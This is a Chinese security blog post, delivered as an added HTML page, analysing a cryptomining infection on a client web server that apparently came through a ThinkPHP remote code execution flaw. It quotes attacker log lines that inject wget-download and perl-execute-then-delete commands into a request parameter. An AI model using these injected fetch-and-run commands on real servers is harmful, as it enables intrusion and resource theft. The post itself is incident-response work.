@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+	<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+    <meta name="description" content="龅牙晴在 Github 上的个人博客">
+    <meta name="keyword" content="安全，漏洞挖掘，漏洞复现">
+    <meta name="theme-color" content="#600090">
+    <meta name="msapplication-navbutton-color" content="#600090">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="折戟" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
+    <title>
+        
+        一次挖矿病毒攻击分析｜R_song&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="http://rliyuqing.github.io/2019/04/15/24.一次挖矿病毒攻击分析/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/blog-style.css">
+
+    <!-- Pygments Github CSS -->
+    <link rel="stylesheet" href="/css/syntax.css">
+</head>
+
+<style>
+
+    header.intro-header {
+        background-image: url('http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost="true" data-istags="false
+" data-ishome="false">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand animated pulse" href="/">
+                <span class="brand-logo">
+                    折戟
+                </span>
+                's Blog
+            </a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <!-- /.navbar-collapse -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+					
+                    
+                        
+							
+                        <li>
+                            <a href="/categories/">categories</a>
+                        </li>
+							
+						
+                    
+                        
+							
+                        <li>
+                            <a href="/tags/">tags</a>
+                        </li>
+							
+						
+                    
+					
+					
+                </ul>
+            </div>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+//    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+<!-- Main Content -->
+
+<!--only post-->
+
+
+<img class="wechat-title-img" src="http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+<style>
+    
+    header.intro-header {
+        background-image: url('http://upload-images.jianshu.io/upload_images/6269327-c23742a390edde52.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240')
+    }
+
+    
+</style>
+
+<header class="intro-header">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <div class="post-heading">
+                    <h1>一次挖矿病毒攻击分析</h1>
+                    
+                    <span class="meta">
+                         作者 折戟
+                        <span>
+                          日期 2019-04-15
+                         </span>
+                    </span>
+                    <div class="tags text-center">
+                        
+                        <a class="tag" href="/tags/#攻击分析" title="攻击分析">攻击分析</a>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post-title-haojen">
+        <span>
+            一次挖矿病毒攻击分析
+        </span>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Container -->
+            <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
+                <hr>
+<h1 id="一次挖矿病毒攻击分析"><a href="#一次挖矿病毒攻击分析" class="headerlink" title="一次挖矿病毒攻击分析"></a>一次挖矿病毒攻击分析</h1><hr>
+<p>这两天期末了，最近老板这里突然来了个任务，客户服务器被攻击了，某台机器的cpu一直都跑满了，持续高负荷状态，客户公司的运营实在没有办法找到了我们。<br>先说一说之前这台服务器也出现过问题，被两波人搞过，一波写了webshell，另个一种了挖矿病毒，都被清除了，当然这些我都没有参与。<br>因为老板比较忙，我和另一个小伙伴接手进行分析，我们拿到这台服务器，既然是web服务器，最好得最有效的办法就是看web日志，但是这个日志是在很多，这就考虑经验问题了，另一个小伙伴道行比我深，他发现了痕迹：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat aso_access.log | grep <span class="string">"wget"</span> | grep <span class="string">"/2019"</span>|grep <span class="string">"200"</span></span><br></pre></td></tr></table></figure></p>
+<p>通过很多尝试，在筛选“wget”的时候找到了攻击痕迹。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - - [xx/xx/2019:xx:xx:xx +0800] <span class="string">"POST /?module=wget [http://xxx.xxx.xxx.xxx/ibus](http://xxx.xxx.xxx.xxx/ibus) -O /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 2979 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p>
+<p>emmmmm，看到这个POST的请求，基本可以猜测出就是这几天爆出的thinkphp新的rce，具体读者可以去看看相关的报告，rce的分析网上也有了，有想去的可以去了解一下。根据这条日志，筛选ip我们找到了具体的攻击痕迹：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - - [xx/xx/2019:xx:xx:xx +0800] <span class="string">"POST /?module=wget [http://xxx.xxx.xxx.xxx/ibus](http://xxx.xxx.xxx.xxx/ibus) -O /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 2979 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p>
+<p>上传ibus脚本文件到tmp目录下命名为指定文件，这里www用户有对tmp目录的读写权限。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ xxx.xxx.xxx.xxx - -  [xx/xx/2019:xx:xx:xx +0800]  <span class="string">"POST /?module=perl /tmp/6b5a412bb56c0f0af33017cc88718de3;sleep 2;rm -rf /tmp/6b5a412bb56c0f0af33017cc88718de3 HTTP/1.1"</span> 200 3699 <span class="string">"-"</span> <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0"</span></span><br></pre></td></tr></table></figure></p>
+<p>执行tmp中上传的指定文件，并等待执行完成，删除文件.<br>本地虚拟环境执行了一下这个ibus脚本：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-c63d320e2b0401d1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="本地执行脚本"><br>可以看到这里执行生成了三个sh简单加密的脚本文件：nmi，nbus和.dbus是哪个文件，这三个脚本文件解密之后是三个cat和perl的脚本，分别执行了一下命令：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat /xxx/xxx/xxx/xxx/Favicon.ico | perl</span><br><span class="line">$ cat /xxx/xxx/pkcs | perl</span><br><span class="line">$ cat /xxx/xxx/xxx/xxxxx/xxx/xxxxxx/mockup | perl</span><br></pre></td></tr></table></figure></p>
+<p>执行了三个perl脚本，就是挖矿的脚本了。最后我们把生成的恶意文件备份之后就进行清除了，总共是三个sh脚本，三个perl挖矿脚本和两个记录id的随机数之类的文件。<br>怎么说呢，这次攻击分析看似挺简单的，但是最难的部分，从日志里找出攻击者的恶意访问是很困难的，需要有很多的经验，比如对最近新漏洞的了解，以及各类典型漏洞的攻击方式，才能及时的从庞大的日志文件中根据特征找到攻击者的痕迹。<br>安全从业者还是十分吃经验的，博主也会更多的在实战中历练自己，也会分享记录自己的经验。</p>
+
+                <hr>
+                
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2019/04/15/23.校园提供给第三方的接口信息泄露 - 副本/" data-toggle="tooltip" data-placement="top" title="校园提供给第三方的接口信息泄露">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2019/04/15/25.内网隔离和纵深防御浅谈/" data-toggle="tooltip" data-placement="top" title="内网隔离和纵深防御浅谈">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                
+
+                
+
+
+                <!--加入新的评论系统-->
+                
+            </div>
+
+            <div class="hidden-xs col-sm-3 toc-col">
+                <div class="toc-wrap">
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一次挖矿病毒攻击分析"><span class="toc-text">一次挖矿病毒攻击分析</span></a></li></ol>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5 class="text-center">
+                        <a href="/tags/">FEATURED TAGS</a>
+                    </h5>
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/#攻击分析" title="攻击分析">攻击分析</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <div style="margin-top: 20px;">
+                    <h5 class="text-center">FRIENDS</h5>
+                    <ul class="list-inline text-center">
+                        
+                        <li><a href="https://teazmh.github.io/">Tea_Mh</a></li>
+                        
+                        <li><a href="https://zheng19970225.github.io/">让子弹飞一会</a></li>
+                        
+                        <li><a href="https://luckyjq.github.io/">LuckyQ</a></li>
+                        
+                    </ul>
+                </div>
+                
+            </div>
+        </div>
+
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- Footer -->
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                <br>
+                <ul class="list-inline text-center">
+                
+                
+                    <li>
+                        <a target="_blank" href="https://twitter.com/IIGHJH5O4mvbeF9?s=09">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+                
+                    <li>
+                        <a target="_blank" href="https://www.zhihu.com/people/rao-song-63?utm_source=qq&amp;utm_medium=social">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa  fa-stack-1x fa-inverse">知</i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/u/3870422953?refer_flag=1001030001_&amp;nick=RS丶从徒手开碧根果开始">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank" href="https://github.com/rliyuqing">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; 折戟 2019
+                    <br>
+                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
+                    <br>
+                     Theme by Haojen Ma
+                </p>
+
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/blog.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://rliyuqing.github.io/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- swiftype -->
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+  (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+  e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install','','2.0.0');
+</script>
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<!--wechat title img-->
+<img class="wechat-title-img" src="http://upload-images.jianshu.io/upload_images/6269327-4c7992ea7ad8aea9.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+<script type="text/javascript"
+color="0,0,0" opacity='0.4' zIndex="-2" count="66" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+	
+
+
+</body>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+</html>
